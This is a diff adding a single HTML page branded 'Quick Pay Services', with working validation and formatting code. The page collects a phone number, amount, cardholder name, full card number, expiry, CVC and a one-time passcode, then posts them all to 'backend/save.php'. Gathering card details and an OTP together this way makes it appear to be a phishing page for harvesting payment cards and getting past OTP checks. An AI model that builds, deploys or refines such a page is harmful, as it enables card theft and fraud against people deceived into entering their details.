@@ -1,0 +1,295 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/x-icon" href="./favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
+    <title>Quick Pay Services - Fast & Secure Payments</title>
+    <script type="module" crossorigin src="./assets/index-PYrti-H9.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-gSKjCrt5.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  
+<form id="payForm">
+  <div class="form-group">
+    <input name="phone" placeholder="Phone" required pattern="[0-9+\-\s()]+"><br>
+    <span class="error" id="phone-error"></span>
+  </div>
+  <div class="form-group">
+    <input name="amount" placeholder="Amount" required type="number" min="0.01" step="0.01"><br>
+    <span class="error" id="amount-error"></span>
+  </div>
+  <div class="form-group">
+    <input name="name" placeholder="Cardholder Name" required pattern="[A-Za-z\s]+"><br>
+    <span class="error" id="name-error"></span>
+  </div>
+  <div class="form-group">
+    <input name="card_number" placeholder="Card Number" required pattern="[0-9\s]{13,19}" maxlength="19"><br>
+    <span class="error" id="card-error"></span>
+  </div>
+  <div class="form-group">
+    <input name="expiry" placeholder="Expiry (MM/YY)" required pattern="(0[1-9]|1[0-2])\/([0-9]{2})" maxlength="5"><br>
+    <span class="error" id="expiry-error"></span>
+  </div>
+  <div class="form-group">
+    <input name="cvc" placeholder="CVC" required pattern="[0-9]{3,4}" maxlength="4"><br>
+    <span class="error" id="cvc-error"></span>
+  </div>
+  <div class="form-group">
+    <input name="otp" placeholder="OTP" pattern="[0-9]{4,8}" maxlength="8"><br>
+    <span class="error" id="otp-error"></span>
+  </div>
+  <button type="submit" id="submit-btn">Submit</button>
+  <div id="message"></div>
+</form>
+
+<style>
+.form-group {
+  margin-bottom: 15px;
+}
+
+.form-group input {
+  width: 100%;
+  padding: 10px;
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  box-sizing: border-box;
+}
+
+.error {
+  color: red;
+  font-size: 12px;
+  display: block;
+  margin-top: 5px;
+}
+
+#message {
+  margin-top: 15px;
+  padding: 10px;
+  border-radius: 4px;
+  display: none;
+}
+
+.success {
+  background-color: #d4edda;
+  color: #155724;
+  border: 1px solid #c3e6cb;
+}
+
+.error-msg {
+  background-color: #f8d7da;
+  color: #721c24;
+  border: 1px solid #f5c6cb;
+}
+
+button {
+  background-color: #007bff;
+  color: white;
+  padding: 12px 24px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  background-color: #0056b3;
+}
+
+button:disabled {
+  background-color: #6c757d;
+  cursor: not-allowed;
+}
+</style>
+
+<script>
+(function() {
+  'use strict';
+  
+  // Input sanitization function
+  function sanitizeInput(input) {
+    const div = document.createElement('div');
+    div.textContent = input;
+    return div.innerHTML;
+  }
+  
+  // Validation functions
+  function validatePhone(phone) {
+    const phoneRegex = /^[0-9+\-\s()]+$/;
+    return phoneRegex.test(phone) && phone.length >= 10;
+  }
+  
+  function validateAmount(amount) {
+    const num = parseFloat(amount);
+    return !isNaN(num) && num > 0;
+  }
+  
+  function validateName(name) {
+    const nameRegex = /^[A-Za-z\s]+$/;
+    return nameRegex.test(name) && name.length >= 2;
+  }
+  
+  function validateCardNumber(cardNumber) {
+    const cleaned = cardNumber.replace(/\s/g, '');
+    return /^[0-9]{13,19}$/.test(cleaned);
+  }
+  
+  function validateExpiry(expiry) {
+    const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+    if (!expiryRegex.test(expiry)) return false;
+    
+    const [month, year] = expiry.split('/');
+    const now = new Date();
+    const currentYear = now.getFullYear() % 100;
+    const currentMonth = now.getMonth() + 1;
+    
+    const expiryYear = parseInt(year, 10);
+    const expiryMonth = parseInt(month, 10);
+    
+    if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
+      return false;
+    }
+    
+    return true;
+  }
+  
+  function validateCVC(cvc) {
+    return /^[0-9]{3,4}$/.test(cvc);
+  }
+  
+  function showError(fieldId, message) {
+    const errorElement = document.getElementById(fieldId + '-error');
+    if (errorElement) {
+      errorElement.textContent = message;
+    }
+  }
+  
+  function clearErrors() {
+    const errorElements = document.querySelectorAll('.error');
+    errorElements.forEach(el => el.textContent = '');
+  }
+  
+  function showMessage(message, isError = false) {
+    const messageDiv = document.getElementById('message');
+    messageDiv.textContent = message;
+    messageDiv.className = isError ? 'error-msg' : 'success';
+    messageDiv.style.display = 'block';
+    
+    setTimeout(() => {
+      messageDiv.style.display = 'none';
+    }, 5000);
+  }
+  
+  // Form submission handler
+  document.getElementById('payForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    clearErrors();
+    
+    const formData = new FormData(this);
+    const submitBtn = document.getElementById('submit-btn');
+    
+    // Client-side validation
+    let hasErrors = false;
+    
+    const phone = formData.get('phone');
+    if (!validatePhone(phone)) {
+      showError('phone', 'Please enter a valid phone number');
+      hasErrors = true;
+    }
+    
+    const amount = formData.get('amount');
+    if (!validateAmount(amount)) {
+      showError('amount', 'Please enter a valid amount');
+      hasErrors = true;
+    }
+    
+    const name = formData.get('name');
+    if (!validateName(name)) {
+      showError('name', 'Please enter a valid name (letters and spaces only)');
+      hasErrors = true;
+    }
+    
+    const cardNumber = formData.get('card_number');
+    if (!validateCardNumber(cardNumber)) {
+      showError('card', 'Please enter a valid card number');
+      hasErrors = true;
+    }
+    
+    const expiry = formData.get('expiry');
+    if (!validateExpiry(expiry)) {
+      showError('expiry', 'Please enter a valid expiry date (MM/YY)');
+      hasErrors = true;
+    }
+    
+    const cvc = formData.get('cvc');
+    if (!validateCVC(cvc)) {
+      showError('cvc', 'Please enter a valid CVC');
+      hasErrors = true;
+    }
+    
+    if (hasErrors) {
+      showMessage('Please correct the errors above', true);
+      return;
+    }
+    
+    // Disable submit button to prevent double submission
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Processing...';
+    
+    // Submit form
+    fetch('backend/save.php', {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => {
+      if (!response.ok) {
+        return response.text().then(text => {
+          throw new Error(text || 'Network response was not ok');
+        });
+      }
+      return response.text();
+    })
+    .then(responseText => {
+      if (responseText.trim() === 'success') {
+        showMessage('Payment information submitted successfully!');
+        this.reset();
+      } else {
+        showMessage('Error: ' + sanitizeInput(responseText), true);
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      showMessage('An error occurred while processing your request. Please try again.', true);
+    })
+    .finally(() => {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Submit';
+    });
+  });
+  
+  // Add formatting for card number input
+  document.querySelector('input[name="card_number"]').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s/g, '');
+    let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
+    if (formattedValue.length > 19) {
+      formattedValue = formattedValue.substring(0, 19);
+    }
+    e.target.value = formattedValue;
+  });
+  
+  // Add formatting for expiry input
+  document.querySelector('input[name="expiry"]').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+      value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    e.target.value = value;
+  });
+})();
+</script>
+
+</body>
+</html>
